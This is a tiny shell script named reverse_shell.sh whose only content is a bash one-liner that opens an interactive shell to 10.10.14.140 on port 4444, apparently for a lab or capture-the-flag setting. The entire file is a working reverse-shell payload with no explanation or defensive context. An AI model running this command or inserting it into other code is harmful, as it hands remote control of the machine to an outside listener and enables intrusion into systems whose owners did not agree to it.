# reverse_shell.sh
bash -i >& /dev/tcp/10.10.14.140/4444 0>&1
